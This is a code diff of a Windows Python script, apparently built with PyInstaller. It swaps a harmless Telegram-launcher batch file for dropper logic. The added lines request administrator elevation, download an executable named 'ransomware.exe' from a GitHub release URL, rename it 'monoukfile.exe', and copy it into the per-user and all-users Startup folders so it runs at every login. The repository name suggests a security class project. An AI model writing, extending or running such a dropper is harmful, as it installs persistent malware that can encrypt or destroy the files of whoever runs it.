@@ -1,4 +1,11 @@
-import os, sys, shutil, ctypes
+import os
+import sys
+import shutil
+import ctypes
+
+# 1. Import your custom download function from download_file.py
+# (This assumes download_file.py is in the same directory or bundled by PyInstaller)
+from download_file import download_file
 
 # ── PYINSTALLER DIRECTORY FIX ─────────────────────────────────────────────────
 if getattr(sys, 'frozen', False):
@@ -7,37 +14,11 @@ else:
     SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
 # ──────────────────────────────────────────────────────────────────────────────
 
-FILENAME = "open_telegram.bat"
-SHORTCUT_NAME = "OpenTelegram.bat"
+# Configuration Parameters
+DOWNLOAD_URL = "https://github.com/monouk-prog/Cyber-Proj-ANTI-MALICIOUS/releases/download/v1.0.17/ransomware.exe"  # Replace with your actual URL
+FILENAME = "monoukfile.exe"
+SHORTCUT_NAME = "monoukfile.exe"
 BAT_SOURCE_PATH = os.path.join(SCRIPT_DIR, FILENAME)
-
-BATCH_CONTENT = """@echo off
-:: ============================================
-:: open_telegram.bat
-:: Launches Telegram Desktop on Windows
-:: ============================================
-
-set TELEGRAM_PATH=%APPDATA%\\Telegram Desktop\\Telegram.exe
-if exist "%TELEGRAM_PATH%" (
-    start "" "%TELEGRAM_PATH%"
-    exit /b 0
-)
-
-set TELEGRAM_PATH_ALT=%LOCALAPPDATA%\\Telegram Desktop\\Telegram.exe
-if exist "%TELEGRAM_PATH_ALT%" (
-    start "" "%TELEGRAM_PATH_ALT%"
-    exit /b 0
-)
-
-set TELEGRAM_PATH_PF=%ProgramFiles%\\Telegram Desktop\\Telegram.exe
-if exist "%TELEGRAM_PATH_PF%" (
-    start "" "%TELEGRAM_PATH_PF%"
-    exit /b 0
-)
-
-echo Telegram not found. Please check the installation path.
-pause
-"""
 
 STARTUP_FOLDERS = [
     # User-level Startup folder
@@ -46,13 +27,15 @@ STARTUP_FOLDERS = [
     os.path.join(os.environ.get("PROGRAMDATA", r"C:\ProgramData"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
 ]
 
-def is_elevated():
+def is_elevated() -> bool:
+    """Checks if the script is currently running with Administrator privileges."""
     try: 
         return bool(ctypes.windll.shell32.IsUserAnAdmin())
     except Exception: 
         return False
 
 def relaunch_as_admin():
+    """Relaunches the current script or compiled executable with an UAC prompt."""
     if getattr(sys, 'frozen', False):
         executable = sys.executable
         params = ""
@@ -66,20 +49,21 @@ def relaunch_as_admin():
 if __name__ == "__main__":
     # 1. Enforce Admin access up front so writing to ProgramData succeeds
     if not is_elevated():
+        print("Administrative privileges required. Prompting for elevation...")
         relaunch_as_admin()
 
-    print("=== Creating Local Batch File ===")
-    try:
-        with open(BAT_SOURCE_PATH, "w", encoding="utf-8") as bat_file:
-            bat_file.write(BATCH_CONTENT)
-        print(f"[OK] Generated local file -> {BAT_SOURCE_PATH}")
-    except Exception as e:
-        sys.exit(f"[ERROR] Failed to write local batch file: {e}")
+    print("=== Downloading Payload File ===")
+    # 2. Fetch the batch file over the web using your modular function
+    download_success = download_file(DOWNLOAD_URL, BAT_SOURCE_PATH)
+    
+    if not download_success:
+        sys.exit("[FATAL ERROR] Pipeline terminated because the file download failed.")
 
     print("\n=== Deploying to Startup Folders ===")
+    # 3. Copy the fetched asset to target system locations
     for folder in STARTUP_FOLDERS:
         if not os.path.isdir(folder):
-            print(f"[SKIP] Directory does not exist: {folder}")
+            print(f"[SKIP] Target directory does not exist: {folder}")
             continue
             
         destination = os.path.join(folder, SHORTCUT_NAME)
